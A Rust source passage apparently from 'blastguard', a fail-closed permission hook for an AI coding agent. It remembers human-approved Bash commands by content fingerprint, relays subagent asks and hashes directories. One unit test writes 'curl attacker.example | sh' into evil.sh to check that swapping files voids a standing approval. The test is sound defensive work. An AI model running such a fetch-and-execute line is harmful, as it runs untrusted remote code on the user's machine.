        if !dir.trim().is_empty() {
            return std::path::PathBuf::from(dir.trim());
        }
    }
    harness_core::config::base_dir("blastguard").join("approvals")
}

/// The Bash command line this payload describes, if it describes one.
///
/// The memory covers `Bash` only. `Edit`/`Write`/`MultiEdit` are deliberately
/// excluded: their "parameters" include the new file CONTENT, so an approval
/// keyed on the effect would be single-use by construction and the store would
/// grow one dead entry per edit. The repetitive asking the user reported was
/// about commands — 「taintguard はbashコマンドそのものを検出していた」 — so
/// that is the scope, and the narrower scope is the restrictive one.
fn bash_command(input: &HookInput) -> Option<String> {
    if input.tool_name != "Bash" {
        return None;
    }
    let command = input.tool_input.as_ref()?.get("command")?.as_str()?;
    if command.trim().is_empty() {
        return None;
    }
    Some(command.to_string())
}

/// Downgrade an `Ask` this session has already answered, and stash the pending
/// fingerprint for the ones it has not.
///
/// # What this may and may not do
///
/// It matches on `Decision::Ask` and returns every other variant untouched, so
/// a `Deny` is structurally out of reach — not "not currently downgraded", but
/// unreachable from this function's only mutating arm. It also never produces
/// anything stricter than what it was given: an unreadable store or an
/// unfingerprintable command returns the original `Ask` verbatim.
///
/// # Why this runs BEFORE `emit`'s hardening
///
/// `emit` hardens `Ask` → `Deny` when no human can answer
/// ([`interactive::ask_available`]). Consulting the memory first means a
/// headless run CAN be allowed by a human's earlier approval — which is the
/// point of the feature (the agent-driven sessions are the ones drowning in
/// unanswerable asks), and is not a weakening of the headless posture in the
/// direction that matters: the approval is still evidence of a human decision
/// about this exact effect, taken in an interactive session, invalidated the
/// moment the parameters or the targets move.
fn consult_memory(input: &HookInput, decision: Decision) -> Decision {
    let Decision::Ask(reason) = decision else {
        // Allow and Deny are returned as-is. The memory has no upgrade path and
        // no override path.
        return decision;
    };
    let Some(command) = bash_command(input) else {
        return Decision::Ask(reason);
    };
    let scope = safe_roots(input);
    let fingerprint = match approve::fingerprint(&input.tool_name, &command, &scope, probe_target) {
        harness_core::verdict::Determination::Known(fp) => fp,
        // Not fingerprintable — an expansion, quoting, or an operand that left
        // the tree. No approval can apply, so the ask stands.
        harness_core::verdict::Determination::Undetermined(_) => return Decision::Ask(reason),
    };
    let store = approve::Store::open(memo_dir());
    if store.lookup(&fingerprint).is_approved() {
        return Decision::Allow;
    }
    // Not approved (or the store could not say). Ask — and leave behind what
    // the human is about to look at, so a `PostToolUse` can promote it if they
    // say yes. A failure to stash costs nothing but another ask.
    let _ = hook::catch_and_log("blastguard-approval-pending", || {
        let _ = store.put_pending(
            &approve::command_key(&input.tool_name, &command),
            &fingerprint,
            &command,
        );
    });
    Decision::Ask(reason)
}

/// `blastguard record-approval` — the `PostToolUse` half.
///
/// The tool having RUN is the evidence a human approved it: a `Deny` never
/// reaches `PostToolUse` at all, and an `Ask` the human refused never runs. So
/// this promotes the pending fingerprint `consult_memory` stashed, without
/// needing to know (and without being able to know) what the human clicked.
///
/// It records regardless of whether the command SUCCEEDED. Approval is about
/// permission, not about exit status: a human who approved `chmod -R 755 sub`
/// approved it whether or not it worked.
fn record_approval() {
    let raw = hook::read_stdin();
    if raw.trim().is_empty() {
        return;
    }
    let Some(input) = HookInput::parse(&raw) else {
        return;
    };
    let Some(command) = bash_command(&input) else {
        return;
    };
    let key = approve::command_key(&input.tool_name, &command);
    // `promote` is a no-op when nothing is pending, which is the ordinary case:
    // most tool calls were allowed outright and were never asked about.
    let _ = approve::Store::open(memo_dir()).promote(&key);
}

/// `blastguard relay <sub>` — the subagent Ask relay (user ruling 2026-11-14,
/// 「sub agentのAskはmainで裁定する」; see [`blastguard::relay`]).
///
/// * `mark-executed` — PostToolUse / PostToolUseFailure on Bash.
/// * `mark-relayed`  — PostToolUse on SendMessage.
/// * `stop`          — the main-session Stop gate (has a verdict).
/// * `dismiss <id> --reason <text>` — record why an entry will not be re-run.
///
/// None of these executes a command. The `cwd` stored in an entry is never
/// resolved, stat'ed or entered (user ruling 2026-11-14,
/// 「gateもconduktも絶対に勝手に他のworktreeを参照してはならない」).
fn run_relay(rest: &[String]) -> i32 {
    match rest.first().map(String::as_str) {
        // The markers have no verdict: a lost mark leaves the entry pending,
        // so the Stop gate keeps blocking — the restrictive side. Failures are
        // reported on stderr, never dropped. `run_hook` never returns.
        Some("mark-executed") => hook::run_hook(relay_mark_executed),
        Some("mark-relayed") => hook::run_hook(relay_mark_relayed),
        Some("stop") => relay_stop(),
        Some("dismiss") => relay_dismiss(&rest[1..]),
        _ => {
            eprintln!(
                "usage: blastguard relay mark-executed | mark-relayed | stop | \
                 dismiss <id> --reason <text>"
            );
            2
        }
    }
}

/// Main-session Bash call finished (successfully or not): mark the matching
/// relay entry executed. A call made inside a subagent marks nothing — only
/// the main session adjudicates.
fn relay_mark_executed() {
    let raw = hook::read_stdin();
    if raw.trim().is_empty() || interactive::payload_is_subagent(&raw) {
        return;
    }
    let (Some(input), Ok(value)) = (
        HookInput::parse(&raw),
        serde_json::from_str::<serde_json::Value>(raw.trim()),
    ) else {
        eprintln!("blastguard relay mark-executed: unparseable payload; nothing marked");
        return;
    };
    let Some(command) = bash_command(&input) else {
        return;
    };
    let session = relay::session_of(&input.session_id);
    if let Err(e) = relay::mark_executed(
        &relay::relay_dir(),
        &session,
        &input.cwd,
        &command,
        relay::exit_code_of(&value),
    ) {
        eprintln!(
            "blastguard relay mark-executed: WARNING could not mark ({e}); the entry stays \
             pending and the Stop gate keeps listing it"
        );
    }
}

/// Main-session SendMessage: mark executed entries whose relay id the message
/// names. The whole `tool_input` is searched, so the id may sit in any field.
fn relay_mark_relayed() {
    let raw = hook::read_stdin();
    if raw.trim().is_empty() || interactive::payload_is_subagent(&raw) {
        return;
    }
    let Some(input) = HookInput::parse(&raw) else {
        eprintln!("blastguard relay mark-relayed: unparseable payload; nothing marked");
        return;
    };
    if input.tool_name != "SendMessage" {
        return;
    }
    let Some(tool_input) = input.tool_input.as_ref() else {
        return;
    };
    let text = tool_input.to_string();
    let session = relay::session_of(&input.session_id);
    if let Err(e) = relay::mark_relayed(&relay::relay_dir(), &session, &text) {
        eprintln!(
            "blastguard relay mark-relayed: WARNING could not mark ({e}); the entry stays \
             pending and the Stop gate keeps listing it"
        );
    }
}

/// The main-session Stop gate. Runs under the shared fail-closed Stop barrier
/// (`run_guarded`): a panic blocks. An unparseable payload from a hook (stdin
/// not a terminal) blocks too — the session could not be identified, so its
/// queue could not be read.
fn relay_stop() -> ! {
    const NAME: &str = "blastguard-relay";
    let terminal = std::io::IsTerminal::is_terminal(&std::io::stdin());
    let raw =
        harness_core::gate::run::read_stop_payload_guarded(NAME, terminal, hook::try_read_stdin());
    let input = HookInput::parse(&raw);
    let stop_hook_active = input.as_ref().is_some_and(|h| h.stop_hook_active);
    harness_core::gate::run::run_guarded(NAME, terminal, stop_hook_active, move || {
        let Some(input) = input else {
            if terminal {
                eprintln!("blastguard relay stop: expects a Stop hook payload on stdin");
                exit(2);
            }
            println!(
                "{}",
                serde_json::json!({
                    "decision": "block",
                    "reason": "blastguard relay: the Stop payload could not be parsed, so this \
                               session's subagent Ask relay queue could not be checked; the stop \
                               is blocked (fail-closed)."
                })
            );
            exit(0);
        };
        let session = relay::session_of(&input.session_id);
        match relay::stop_outcome(&relay::relay_dir(), &session) {
            relay::StopOutcome::Block(reason) => println!(
                "{}",
                serde_json::json!({ "decision": "block", "reason": reason })
            ),
            relay::StopOutcome::Allow(Some(msg)) => {
                println!("{}", serde_json::json!({ "systemMessage": msg }))
            }
            relay::StopOutcome::Allow(None) => {}
        }
        exit(0)
    })
}

/// `blastguard relay dismiss <id> --reason <text>`. Exit 0 on success, 2 for
/// a usage error / blank reason / unknown id, 3 when a queue could not be read
/// or written.
fn relay_dismiss(rest: &[String]) -> i32 {
    let mut id: Option<&str> = None;
    let mut reason: Option<&str> = None;
    let mut it = rest.iter();
    while let Some(a) = it.next() {
        match a.as_str() {
            "--reason" => match it.next() {
                Some(r) => reason = Some(r),
                None => {
                    eprintln!("blastguard relay dismiss: --reason needs a value");
                    return 2;
                }
            },
            other if id.is_none() && !other.starts_with("--") => id = Some(other),
            other => {
                eprintln!("blastguard relay dismiss: unexpected argument `{other}`");
                return 2;
            }
        }
    }
    let Some(id) = id else {
        eprintln!("usage: blastguard relay dismiss <id> --reason <text>");
        return 2;
    };
    let Some(reason) = reason else {
        eprintln!("blastguard relay dismiss: --reason <text> is required");
        return 2;
    };
    match relay::dismiss(&relay::relay_dir(), id, reason) {
        Ok(path) => {
            println!(
                "dismissed {id} ({}); it is listed on every later Stop of that session",
                path.display()
            );
            0
        }
        Err(relay::DismissError::EmptyReason) => {
            eprintln!("blastguard relay dismiss: the reason must not be blank");
            2
        }
        Err(relay::DismissError::UnknownId(id)) => {
            eprintln!("blastguard relay dismiss: no relay entry {id}");
            2
        }
        Err(relay::DismissError::Io(e)) => {
            eprintln!("blastguard relay dismiss: {e}");
            3
        }
    }
}

/// How much of a file is read to fingerprint its contents.
///
/// A cap is needed because this runs inside a 10-second hook timeout, and it
/// resolves to the RESTRICTIVE side: a file larger than this is `Undetermined`,
/// so the command is not approvable rather than being approved on the strength
/// of a partial read. 64 MiB is far above any config or script a gate command
/// touches.
const MAX_HASHED_BYTES: u64 = 64 * 1024 * 1024;

/// The injected [`approve::TargetProbe`]: what is at `path` right now?
///
/// `absent` for a missing target, `file:<sha256>` for a regular file, and
/// `dir:<sha256>` for a directory, whose hash covers its whole tree (see
/// [`probe_directory`]). Anything that cannot be fully described is
/// `Undetermined`.
///
/// Read in fixed-size chunks rather than into one buffer, per the repository's
/// data-loading rule — the size cap bounds the work, the chunking bounds the
/// memory.
fn probe_target(path: &str) -> harness_core::verdict::Determination<String> {
    use harness_core::verdict::Determination;

    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            // Absent is a KNOWN state, not an unknown one: `rm -rf target` in a
            // fresh clone is ordinary, and "the target does not exist" is a
            // perfectly stable thing to fingerprint. It also means the approval
            // stops applying the moment the target appears.
            return Determination::known("absent".to_string());
        }
        Err(e) => return Determination::undetermined(format!("metadata failed: {e}")),
    };
    if meta.is_dir() {
        // A directory's CONTENTS are hashed (user ruling 2026-09-24, "Hash dir
        // contents", closing CA-blastguard-02). The previous constant `"dir"`
        // meant a standing approval for a directory operand kept auto-allowing
        // after everything inside it had been swapped out, contradicting the
        // `approve` module contract that every resolved target's CONTENT is
        // part of the key. An approval for a directory now expires whenever
        // anything under it changes — that is the contract, not a defect.
        return probe_directory(std::path::Path::new(path));
    }
    if !meta.is_file() {
        // A socket, fifo or device. Not something whose state this can describe.
        return Determination::undetermined("target is neither a file nor a directory".to_string());
    }
    if meta.len() > MAX_HASHED_BYTES {
        return Determination::undetermined(format!(
            "target is {} bytes, above the {MAX_HASHED_BYTES}-byte hashing cap",
            meta.len()
        ));
    }
    let mut hasher = sha2::Sha256::new();
    let mut budget = MAX_HASHED_BYTES;
    if let Err(why) = hash_file_into(std::path::Path::new(path), &mut hasher, &mut budget) {
        return Determination::undetermined(why);
    }
    use sha2::Digest;
    Determination::known(format!("file:{:x}", hasher.finalize()))
}

/// Upper bound on the number of entries (files, directories, symlinks) a
/// directory fingerprint walks. Above it the directory is `Undetermined` — not
/// approvable — rather than fingerprinted from a partial walk.
const MAX_DIR_ENTRIES: usize = 10_000;

/// Feed the bytes of the regular file at `path` into `hasher`, charging them
/// against `budget`. Any read failure, or exceeding the budget, is an `Err`
/// carrying the reason: a partial hash is never reported as a whole one.
fn hash_file_into(
    path: &std::path::Path,
    hasher: &mut sha2::Sha256,
    budget: &mut u64,
) -> Result<(), String> {
    use sha2::Digest;
    use std::io::Read;
    let mut file = std::fs::File::open(path)
        .map_err(|e| format!("open failed for {}: {e}", path.display()))?;
    let mut buf = [0u8; 64 * 1024];
    loop {
        match file.read(&mut buf) {
            Ok(0) => return Ok(()),
            Ok(n) => {
                let n64 = n as u64;
                if n64 > *budget {
                    return Err(format!(
                        "content under the target exceeds the {MAX_HASHED_BYTES}-byte hashing cap"
                    ));
                }
                *budget -= n64;
                hasher.update(&buf[..n]);
            }
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(e) => return Err(format!("read failed for {}: {e}", path.display())),
        }
    }
}

/// Fingerprint a directory by a deterministic, bounded recursive walk.
///
/// Children are visited in byte-sorted name order, and for each entry the
/// hash absorbs its path RELATIVE to `root`, its kind, and:
///
/// * a regular file — the SHA-256 of its full contents;
/// * a symlink — its link text (not followed: the walk describes this tree,
///   and following would let a cycle or an out-of-tree target into it);
/// * a directory — nothing further; its children follow in the walk.
///
/// Fail-closed (CLAUDE.md §3): every way the walk can fail to complete —
/// a `read_dir`/metadata/read error, more than [`MAX_DIR_ENTRIES`] entries,
/// more than [`MAX_HASHED_BYTES`] of file content in total, or a special file
/// (socket, fifo, device) whose state cannot be described — is
/// `Undetermined`, so no approval can match. It never degrades to a constant.
fn probe_directory(root: &std::path::Path) -> harness_core::verdict::Determination<String> {
    use harness_core::verdict::Determination;
    use sha2::Digest;

    let mut hasher = sha2::Sha256::new();
    let mut budget = MAX_HASHED_BYTES;
    let mut entries: usize = 0;
    // Depth-first with an explicit stack; each directory's children are pushed
    // in REVERSE sorted order so they are popped in sorted order.
    let mut stack: Vec<std::path::PathBuf> = vec![std::path::PathBuf::new()];
    while let Some(rel) = stack.pop() {
        let abs = root.join(&rel);
        // Through the shared boundary: an unlistable directory or an unreadable
        // entry is `Undetermined` for the whole listing, never a partial one.
        let listed = match harness_core::boundary::read_dir_entries(&abs) {
            Determination::Known(v) => v,
            Determination::Undetermined(why) => {
                return Determination::undetermined(format!(
                    "directory walk incomplete: {}",
                    why.as_str()
                ))
            }
        };
        let mut names = Vec::with_capacity(listed.len());
        for p in listed {
            match p.file_name() {
                Some(n) => names.push(n.to_os_string()),
                None => {
                    return Determination::undetermined(format!(
                        "directory entry without a file name: {}",
                        p.display()
                    ))
                }
            }
        }
        // Re-sorted here on the raw bytes so the order this hash depends on is
        // stated in this function, not inherited from the helper.
        names.sort_by(|a, b| a.as_encoded_bytes().cmp(b.as_encoded_bytes()));
        let mut subdirs = Vec::new();
        for name in names {
            entries += 1;
            if entries > MAX_DIR_ENTRIES {
                return Determination::undetermined(format!(
                    "directory has more than {MAX_DIR_ENTRIES} entries; not fingerprinted"
                ));
            }
            let child_rel = rel.join(&name);
            let child_abs = root.join(&child_rel);
            let meta = match std::fs::symlink_metadata(&child_abs) {
                Ok(m) => m,
                Err(e) => {
                    return Determination::undetermined(format!(
                        "metadata failed for {}: {e}",
                        child_abs.display()
                    ))
                }
            };
            // Length-prefixed so no path/kind/data combination can be spelled
            // two ways.
            let rel_bytes = child_rel.as_os_str().as_encoded_bytes();
            hasher.update((rel_bytes.len() as u64).to_le_bytes());
            hasher.update(rel_bytes);
            let ft = meta.file_type();
            if ft.is_symlink() {
                let target = match std::fs::read_link(&child_abs) {
                    Ok(t) => t,
                    Err(e) => {
                        return Determination::undetermined(format!(
                            "read_link failed for {}: {e}",
                            child_abs.display()
                        ))
                    }
                };
                let t = target.as_os_str().as_encoded_bytes();
                hasher.update(b"L");
                hasher.update((t.len() as u64).to_le_bytes());
                hasher.update(t);
            } else if ft.is_dir() {
                hasher.update(b"D");
                subdirs.push(child_rel);
            } else if ft.is_file() {
                let mut file_hasher = sha2::Sha256::new();
                if let Err(why) = hash_file_into(&child_abs, &mut file_hasher, &mut budget) {
                    return Determination::undetermined(why);
                }
                hasher.update(b"F");
                hasher.update(file_hasher.finalize());
            } else {
                return Determination::undetermined(format!(
                    "{} is neither a file, a directory nor a symlink",
                    child_abs.display()
                ));
            }
        }
        stack.extend(subdirs.into_iter().rev());
    }
    Determination::known(format!("dir:{:x}", hasher.finalize()))
}

#[cfg(test)]
#[allow(clippy::panic)]
mod tests {
    use super::*;

    /// 70883137: ANY panic on the verdict path resolves to the blocking exit,
    /// not only the EPIPE one the integration test can induce from outside.
    #[test]
    fn a_panic_on_the_verdict_path_maps_to_the_blocking_exit() {
        let str_panic = std::panic::catch_unwind(|| panic!("boom"));
        assert_eq!(verdict_exit_code(str_panic.map(|_: ()| ())), 2);
        let string_panic = std::panic::catch_unwind(|| panic!("{}", String::from("boom")));
        assert_eq!(verdict_exit_code(string_panic.map(|_: ()| ())), 2);
        let index_panic = std::panic::catch_unwind(|| {
            let v: Vec<u8> = Vec::new();
            let i = v.len() + 1;
            let _ = v[i];
        });
        assert_eq!(verdict_exit_code(index_panic), 2);
        assert_eq!(verdict_exit_code(Ok(())), 0);
    }

    #[test]
    fn rule_id_alone_implies_listing_mode() {
        // Added after the original `retro --list` work landed, and shipped
        // with zero coverage: `run_retro` is never called by any test and
        // `main.rs` had no test module at all, so a regression to "print the
        // unfiltered table when only --rule-id is given" would have kept the
        // suite green. Reachable now only because the flag logic was pulled
        // out of `run_retro` into `parse_retro_args`, a pure function with no
        // I/O — `run_retro` itself still isn't under test (it prints to
        // stdout/stderr and touches the transcript directory), and that gap
        // is called out below rather than papered over.
        let args =
            parse_retro_args(&["--rule-id".to_string(), "some-rule".to_string()]).expect("parses");
        assert!(args.list, "bare --rule-id must imply listing mode");
        assert_eq!(args.rule_filter.as_deref(), Some("some-rule"));
    }

    #[test]
    fn explicit_list_flag_still_works_without_rule_id() {
        let args = parse_retro_args(&["--list".to_string()]).expect("parses");
        assert!(args.list);
        assert_eq!(args.rule_filter, None);
    }

    #[test]
    fn neither_flag_leaves_table_mode() {
        let args = parse_retro_args(&[]).expect("parses");
        assert!(!args.list);
    }

    #[test]
    fn rule_id_without_a_value_is_a_parse_error_not_a_panic() {
        let err = parse_retro_args(&["--rule-id".to_string()]).unwrap_err();
        assert!(err.contains("--rule-id needs a rule id"), "{err}");
    }

    #[test]
    fn an_unknown_flag_is_rejected() {
        let err = parse_retro_args(&["--bogus".to_string()]).unwrap_err();
        assert!(err.contains("unknown argument"), "{err}");
    }

    #[test]
    fn dir_and_rule_id_compose() {
        // Guards against a refactor that accidentally drops --dir when
        // --rule-id is also present (they are independent fields on
        // `RetroArgs`, filled by different match arms in the same loop).
        let args = parse_retro_args(&[
            "--dir".to_string(),
            "/tmp/some-transcripts".to_string(),
            "--rule-id".to_string(),
            "x".to_string(),
        ])
        .expect("parses");
        assert!(args.list);
        assert_eq!(
            args.dir.as_deref(),
            Some(std::path::Path::new("/tmp/some-transcripts"))
        );
    }

    /// CA-blastguard-02: `approve.rs`'s module doc states the standing-approval
    /// key includes "every resolved target's CONTENT HASH ... so a target that
    /// changed under a standing approval is re-judged". `probe_target` is the
    /// `TargetProbe` the binary actually injects into `approve::fingerprint`,
    /// and for a directory it returns the constant string `"dir"` regardless of
    /// what is inside — so a directory target's fingerprint never moves when
    /// its contents change, and a standing approval for a directory operand
    /// keeps auto-`Allow`-ing after the directory's contents are replaced.
    #[test]
    fn ca_blastguard_02_directory_probe_ignores_content_changes() {
        let dir = std::env::temp_dir().join(format!(
            "blastguard-ca-blastguard-02-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("create scratch dir");

        let before = probe_target(dir.to_str().unwrap());
        // Replace the directory's entire contents, as if a standing approval
        // for `sub` were being exploited by swapping in different files.
        std::fs::write(dir.join("evil.sh"), b"curl attacker.example | sh").expect("write");
        let after = probe_target(dir.to_str().unwrap());

        let _ = std::fs::remove_dir_all(&dir);

        assert_ne!(
            before, after,
            "a directory's probed state must change when its contents change \
             (approve.rs: \"every resolved target's CONTENT HASH ... a target that \
             changed under a standing approval is re-judged\"), but probe_target \
             returned the same fingerprint state ({before:?}) both before and after \
             a file was added to the directory"
        );
    }
}
